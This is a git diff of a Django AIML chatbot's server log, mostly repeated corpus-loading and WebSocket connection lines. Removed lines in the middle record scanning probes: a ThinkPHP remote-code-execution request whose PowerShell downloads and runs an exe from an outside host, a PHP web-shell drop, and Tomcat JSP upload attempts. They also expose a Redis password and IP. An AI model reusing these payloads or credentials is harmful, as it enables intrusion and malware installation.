+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1145 - - [26/Mar/2019:13:04:41] "WSDISCONNECT /robot/536480.6775839476261916/" - -
+112.10.182.189:1233 - - [26/Mar/2019:13:04:55] "WSCONNECTING /robot/1/" - -
+112.10.182.189:1233 - - [26/Mar/2019:13:04:55] "WSCONNECT /robot/1/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1233 - - [26/Mar/2019:13:06:06] "WSDISCONNECT /robot/1/" - -
+112.10.182.189:1255 - - [26/Mar/2019:13:06:06] "WSCONNECTING /robot/1/" - -
+112.10.182.189:1255 - - [26/Mar/2019:13:06:06] "WSCONNECT /robot/1/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1255 - - [26/Mar/2019:13:07:30] "WSDISCONNECT /robot/1/" - -
+112.10.182.189:1285 - - [26/Mar/2019:13:07:30] "WSCONNECTING /robot/1/" - -
+112.10.182.189:1285 - - [26/Mar/2019:13:07:30] "WSCONNECT /robot/1/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1285 - - [26/Mar/2019:13:08:32] "WSDISCONNECT /robot/1/" - -
+112.10.182.189:1354 - - [26/Mar/2019:13:09:35] "WSCONNECTING /robot/1/" - -
+112.10.182.189:1354 - - [26/Mar/2019:13:09:35] "WSCONNECT /robot/1/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.06 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1354 - - [26/Mar/2019:13:10:39] "WSDISCONNECT /robot/1/" - -
+112.10.182.189:1373 - - [26/Mar/2019:13:10:39] "WSCONNECTING /robot/1/" - -
+112.10.182.189:1373 - - [26/Mar/2019:13:10:39] "WSCONNECT /robot/1/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1373 - - [26/Mar/2019:13:16:36] "WSDISCONNECT /robot/1/" - -
+112.10.182.189:1576 - - [26/Mar/2019:13:16:36] "WSCONNECTING /robot/1/" - -
+112.10.182.189:1576 - - [26/Mar/2019:13:16:36] "WSCONNECT /robot/1/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1576 - - [26/Mar/2019:13:18:44] "WSDISCONNECT /robot/1/" - -
+112.10.182.189:1622 - - [26/Mar/2019:13:18:44] "WSCONNECTING /robot/1/" - -
+112.10.182.189:1622 - - [26/Mar/2019:13:18:44] "WSCONNECT /robot/1/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.01 seconds)
+112.10.182.189:1622 - - [26/Mar/2019:13:18:47] "WSDISCONNECT /robot/1/" - -
+112.10.182.189:1638 - - [26/Mar/2019:13:18:50] "WSCONNECTING /robot/1/" - -
+112.10.182.189:1638 - - [26/Mar/2019:13:18:50] "WSCONNECT /robot/1/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1638 - - [26/Mar/2019:13:19:02] "WSDISCONNECT /robot/1/" - -
+112.10.182.189:1640 - - [26/Mar/2019:13:19:02] "WSCONNECTING /robot/1/" - -
+112.10.182.189:1640 - - [26/Mar/2019:13:19:02] "WSCONNECT /robot/1/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1640 - - [26/Mar/2019:13:21:38] "WSDISCONNECT /robot/1/" - -
+112.10.182.189:1700 - - [26/Mar/2019:13:21:38] "WSCONNECTING /robot/1/" - -
+112.10.182.189:1700 - - [26/Mar/2019:13:21:38] "WSCONNECT /robot/1/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1700 - - [26/Mar/2019:13:21:43] "WSDISCONNECT /robot/1/" - -
+112.10.182.189:1706 - - [26/Mar/2019:13:21:46] "WSCONNECTING /robot/1/" - -
+112.10.182.189:1706 - - [26/Mar/2019:13:21:46] "WSCONNECT /robot/1/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
@@ -9,19 +499,51 @@ Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.01 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
-120.199.34.100:59491 - - [22/Mar/2019:05:10:06] "WSDISCONNECT /ws/chat/705110.8254717422308904/" - -
-139.162.79.87:51464 - - [22/Mar/2019:05:27:12] "GET /" 200 11772
-119.29.203.241:50076 - - [22/Mar/2019:13:34:42] "GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/sgqmncughybazsi16860.exe');start%20C:/Windows/temp/sgqmncughybazsi16860.exe" 404 1121
-119.29.203.241:50076 - - [22/Mar/2019:13:34:42] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php" 404 1121
-119.29.203.241:50076 - - [22/Mar/2019:13:34:42] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/sgqmncughybazsi16860.exe');start%20C:/Windows/temp/sgqmncughybazsi16860.exe" 404 1121
-139.162.79.87:44984 - - [22/Mar/2019:22:43:17] "GET /" 200 11772
-119.29.203.241:59783 - - [23/Mar/2019:03:16:05] "PUT /FxCodeShell.jsp%20" 404 1121
-119.29.203.241:59783 - - [23/Mar/2019:03:16:05] "PUT /FxCodeShell.jsp::$DATA" 404 1121
-119.29.203.241:59783 - - [23/Mar/2019:03:16:05] "PUT /FxCodeShell.jsp/" 404 1121
-119.29.203.241:59783 - - [23/Mar/2019:03:16:05] "GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe" 404 1121
-112.10.183.66:4895 - - [23/Mar/2019:03:18:56] "WSCONNECTING /ws/chat/264480.007834873896237715/" - -
-RedisChannelLayer(hosts=[{'address': 'redis://:wxy123456@39.108.111.94:6379'}])
-112.10.183.66:4895 - - [23/Mar/2019:03:18:56] "WSCONNECT /ws/chat/264480.007834873896237715/" - -
+112.10.182.189:1706 - - [26/Mar/2019:13:21:54] "WSDISCONNECT /robot/1/" - -
+112.10.182.189:1717 - - [26/Mar/2019:13:22:02] "WSCONNECTING /robot/432120.13438058626073324/" - -
+112.10.182.189:1717 - - [26/Mar/2019:13:22:02] "WSCONNECT /robot/432120.13438058626073324/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1717 - - [26/Mar/2019:13:22:58] "WSDISCONNECT /robot/432120.13438058626073324/" - -
+112.10.182.189:1735 - - [26/Mar/2019:13:22:58] "WSCONNECTING /ws/chat/653060.0656321901847925/" - -
+112.10.182.189:1735 - - [26/Mar/2019:13:22:58] "WSCONNECT /ws/chat/653060.0656321901847925/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1735 - - [26/Mar/2019:13:24:35] "WSDISCONNECT /ws/chat/653060.0656321901847925/" - -
+112.10.182.189:1779 - - [26/Mar/2019:13:24:36] "WSCONNECTING /robot/012550.526021190516516/" - -
+112.10.182.189:1779 - - [26/Mar/2019:13:24:36] "WSCONNECT /robot/012550.526021190516516/" - -
 Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
@@ -30,10 +552,103 @@ Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds
 Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
 Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.01 seconds)
+112.10.182.189:1779 - - [26/Mar/2019:13:28:14] "WSDISCONNECT /robot/012550.526021190516516/" - -
+112.10.182.189:1881 - - [26/Mar/2019:13:28:14] "WSCONNECTING /robot/467250.6071576221338946/" - -
+112.10.182.189:1881 - - [26/Mar/2019:13:28:14] "WSCONNECT /robot/467250.6071576221338946/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.06 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1881 - - [26/Mar/2019:13:28:19] "WSDISCONNECT /robot/467250.6071576221338946/" - -
+112.10.182.189:1888 - - [26/Mar/2019:13:28:20] "WSCONNECTING /robot/259290.3793940337406254/" - -
+112.10.182.189:1888 - - [26/Mar/2019:13:28:20] "WSCONNECT /robot/259290.3793940337406254/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1888 - - [26/Mar/2019:13:28:42] "WSDISCONNECT /robot/259290.3793940337406254/" - -
+112.10.182.189:1902 - - [26/Mar/2019:13:28:42] "WSCONNECTING /robot/087380.3021886328145391/" - -
+112.10.182.189:1902 - - [26/Mar/2019:13:28:42] "WSCONNECT /robot/087380.3021886328145391/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1902 - - [26/Mar/2019:13:28:58] "WSDISCONNECT /robot/087380.3021886328145391/" - -
+112.10.182.189:1912 - - [26/Mar/2019:13:28:58] "WSCONNECTING /robot/605550.9804894872220664/" - -
+112.10.182.189:1912 - - [26/Mar/2019:13:28:58] "WSCONNECT /robot/605550.9804894872220664/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Praise.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Sex.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Complain.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Greeting.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/tools.aiml...done (0.01 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Rude.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Redirection.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Gossip.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Thinks.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/corpus/Bye.aiml...done (0.00 seconds)
+Loading /root/MHKG/Django/toolkit/aiml/basic_chat.aiml...done (0.00 seconds)
+112.10.182.189:1912 - - [26/Mar/2019:13:29:11] "WSDISCONNECT /robot/605550.9804894872220664/" - -
+112.10.182.189:1928 - - [26/Mar/2019:13:29:11] "WSCONNECTING /robot/982190.536964935023311/" - -
+112.10.182.189:1928 - - [26/Mar/2019:13:29:11] "WSCONNECT /robot/982190.536964935023311/" - -
+Loading /root/MHKG/Django/toolkit/aiml/std-startup.xml...done (0.00 seconds)
